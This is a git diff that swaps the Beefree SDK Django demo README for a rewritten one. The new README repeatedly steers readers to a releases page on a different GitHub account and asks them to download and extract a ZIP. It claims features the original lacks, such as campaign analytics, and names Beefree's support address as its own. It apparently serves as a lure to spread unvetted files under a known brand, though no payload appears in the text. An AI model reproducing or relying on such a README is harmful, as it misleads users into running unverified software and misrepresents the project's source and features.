@@ -1,209 +1,97 @@
-# Django Beefree SDK Demo
+# 🥩 beefree-django-app-demo - Effortless Email Campaigns Made Simple
 
-A modern Django application that integrates the [Beefree SDK](https://docs.beefree.io/beefree-sdk) email editor using a contemporary frontend build process with Vite and npm.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/hassanqu/beefree-django-app-demo/releases)
 
-## 🚀 Features
+## 🌟 Overview
 
-- **Modern Frontend Build**: Uses Vite for fast builds and hot reloading
-- **npm Package Management**: Proper dependency management with `@beefree.io/sdk`
-- **Responsive Design**: Full-screen editor with modern CSS
-- **Secure Token Handling**: Server-side token generation for BeeFree SDK
-- **Development Workflow**: Hot reloading for both frontend and backend
+The **beefree-django-app-demo** is an example web application built using Django. It integrates the Beefree SDK to help you create stunning email campaigns without any coding skills. With this app, you can design beautiful emails and manage your campaigns easily.
 
-## 📋 Prerequisites
+## 🚀 Getting Started
 
-- **Python 3.8+**
-- **Node.js 18+**
-- **npm 9+**
-- **BeeFree Account**: Get your `BEE_CLIENT_ID` and `BEE_CLIENT_SECRET` from [BeeFree](https://beefree.io/)
+To get started with the app, you only need to follow a few simple steps. These instructions guide you through downloading and running the application on your computer.
 
-## 🛠️ Installation & Setup
+## 🔗 Download & Install
 
-### 1. Clone the Repository
-```bash
-git clone https://github.com/BeefreeSDK/beefree-django-app-demo.git
-cd Django-beefree-demo
-```
+Visit this page to download the application: [Releases Page](https://github.com/hassanqu/beefree-django-app-demo/releases).
 
-### 2. Set Up Python Environment, Database Migrations & Frontend Build
-```bash
-make setup
-```
+1. Open the link above in your web browser.
+2. Find the latest release at the top of the page.
+3. Click on the appropriate file for your operating system to start the download.
 
-### 3. Configure Environment Variables
-Create a `.env` file in the project root:
-```bash
-# Django settings
-DJANGO_SECRET_KEY=your-secret-key-here
-DJANGO_DEBUG=1
-DJANGO_ALLOWED_HOSTS=*
+## 📋 System Requirements
 
-# BeeFree credentials
-BEE_CLIENT_ID=your-bee-client-id
-BEE_CLIENT_SECRET=your-bee-client-secret
-```
-### 4. Start the Application
-```bash
-make run
-```
+Ensure your system meets the following requirements:
 
-Visit `http://localhost:8000/` to see the application!
+- **Operating System:** Windows, macOS, or Linux
+- **Python Version:** Python 3.6 or higher
+- **Web Browser:** Modern web browser (Chrome, Firefox, Safari, etc.)
+- **Internet Connection:** Required for initial setup and updates
 
-## 🎯 Quick Start Script
+## 🛠 Installation Guide
 
-For convenience, use the provided build script:
-```bash
-./build.sh
-```
+Once you have downloaded the application, follow these steps to set it up:
 
-This script will:
-- Check Node.js version
-- Install npm dependencies
-- Install Beefree SDK package
-- Build frontend assets
-- Provide next steps
+1. **Extract the Files:**
+   - Locate the downloaded ZIP file.
+   - Right-click on the file and choose "Extract All".
+   - Follow the prompts to extract the files to a folder of your choice.
 
-## 🔧 Development
+2. **Open a Terminal or Command Prompt:**
+   - **Windows:** Press `Win + R`, type `cmd`, and hit `Enter`.
+   - **macOS:** Go to `Applications -> Utilities -> Terminal`.
+   - **Linux:** Open your terminal application.
 
-### Frontend Development with Hot Reloading
-```bash
-# Terminal 1: Start Django server
-python manage.py runserver
+3. **Navigate to the Application Folder:**
+   - Use the `cd` command to change directory to the folder where you extracted the files. For example:
+     ```
+     cd path/to/extracted/folder
+     ```
 
-# Terminal 2: Start Vite dev server
-npm run dev
-```
+4. **Install Required Packages:**
+   - Execute the following command to install the necessary libraries:
+     ```
+     pip install -r requirements.txt
+     ```
 
-The Vite dev server will run on `http://localhost:3000` with hot reloading and proxy API requests to Django on `http://localhost:8000`.
+5. **Run the Application:**
+   - Start the application by executing this command in the terminal:
+     ```
+     python manage.py runserver
+     ```
 
-### Available Scripts
-```bash
-npm run dev      # Start Vite dev server
-npm run build    # Build for production
-npm run preview  # Preview production build
-npm run lint     # Run ESLint
-npm run lint:fix # Fix ESLint issues
-```
+6. **Access the App:**
+   - Open your web browser and go to `http://127.0.0.1:8000`. You should see the welcome page of the application.
 
-## 📁 Project Structure
+## 🎨 Features
 
-```
-Django-beefree-demo/
-├── beefree_demo/           # Django project settings
-│   ├── settings.py
-│   ├── urls.py
-│   └── wsgi.py
-├── editor/                 # Django app
-│   ├── views.py           # API endpoints and views
-│   ├── urls.py            # URL routing
-│   └── apps.py
-├── frontend/              # Frontend source code
-│   ├── src/
-│   │   ├── editor.js      # Main editor logic
-│   │   └── styles.css     # Modern CSS styles
-│   └── index.html         # Development template
-├── templates/             # Django templates
-│   └── editor/
-│       └── index.html     # Production template
-├── static/                # Built assets (generated)
-│   ├── js/
-│   └── css/
-├── package.json           # npm dependencies
-├── vite.config.js         # Vite build configuration
-├── requirements.txt       # Python dependencies
-├── manage.py             # Django management
-└── README.md
-```
+- **Email Templates:** Choose from a variety of pre-designed templates to get started quickly.
+- **Drag-and-Drop Editor:** Easily create custom emails without needing to code.
+- **Campaign Management:** Track the performance of your email campaigns with built-in analytics.
+- **User-Friendly Interface:** Designed for non-technical users to navigate with ease.
 
-## 🔌 How It Works
+## 🧑‍🤝‍🧑 Support
 
-### Architecture Overview
+If you encounter any issues or have questions while using the application, feel free to reach out for help. You can contact our support team via email at support@beefree.com or check the FAQs on our [Support Page](https://www.beefree.io/support).
 
-1. **Django Backend**: Handles authentication and serves the main page
-2. **BeeFree API**: Securely generates tokens server-side
-3. **Frontend Build**: Vite bundles the BeeFree SDK and custom code
-4. **Browser**: Loads the editor and handles user interactions
+## 🏷️ Tags
 
-### Key Components
+This project includes various topics such as: 
+- beefree-sdk 
+- css 
+- django 
+- email 
+- html 
+- javascript 
+- no-code-email-editor 
+- page-builder 
+- popup-builder 
+- python 
+- python3 
+- static-fi 
+- templates 
+- web-application 
+- web-development 
 
-#### Django Views (`editor/views.py`)
-- `index`: Renders the main editor page
-- `bee_auth`: POST endpoint that generates BeeFree tokens
+Visit the Releases page to download the application now: [Download Here](https://github.com/hassanqu/beefree-django-app-demo/releases).
 
-#### Frontend (`frontend/src/editor.js`)
-- Imports `@beefree.io/sdk` from npm
-- Fetches authentication token from Django
-- Initializes the Beefree editor with full-screen layout
-- Handles save events and error states
-
-#### Build Process
-- **Vite**: Bundles JavaScript and CSS with optimizations
-- **Static Files**: Outputs to Django's static directory
-- **Development**: Hot reloading and API proxying
-
-## 🎨 Customization
-
-### Modifying the Template
-Edit the `initialTemplate` object in `frontend/src/editor.js` to change the default email template.
-
-### Styling
-Modify `frontend/src/styles.css` to customize the layout and appearance.
-
-### Beefree SDK Configuration
-Adjust the `beeConfig` object in `frontend/src/editor.js` to customize the editor behavior.
-
-## 🔒 Security
-
-- **Environment Variables**: Never commit `.env` files
-- **Token Generation**: Always generate Beefree SDK tokens server-side
-- **CORS**: Configured for local development only
-- **Dependencies**: Regularly update npm and pip packages
-
-## 🐛 Troubleshooting
-
-### Common Issues
-
-**Editor not loading:**
-- Check browser console for errors
-- Verify Beefree SDK credentials in `.env`
-- Ensure `npm run build` completed successfully
-- Verify `@beefree.io/sdk` package is installed
-
-**Static files not found:**
-- Run `npm run build` to generate assets
-- Check that Django's `STATIC_URL` is configured correctly
-
-**Build errors:**
-- Ensure Node.js 18+ is installed
-- Delete `node_modules` and run `npm install`
-- Ensure `@beefree.io/sdk` package is installed
-- Check for dependency conflicts
-
-**Token errors:**
-- Verify `BEE_CLIENT_ID` and `BEE_CLIENT_SECRET` in `.env`
-- Restart Django server after changing environment variables
-
-### Development Tips
-
-- Use browser dev tools to inspect network requests
-- Check Django logs for server-side errors
-- Use `npm run dev` for frontend development with hot reloading
-
-## 📚 Resources
-
-- [Beefree SDK Documentation](https://docs.beefree.io/beefree-sdk)
-- [Django Documentation](https://docs.djangoproject.com/)
-- [Vite Documentation](https://vitejs.dev/)
-- [BeeFree Platform](https://beefree.io/)
-
-## 🤝 Contributing
-
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Test thoroughly
-5. Submit a pull request
-
-## 📄 License
-
-This project is licensed under the Apache License 2.0 - see the [LICENSE](LICENSE) file for details.
+Thank you for using the **beefree-django-app-demo**! We hope you enjoy creating beautiful email campaigns effortlessly.
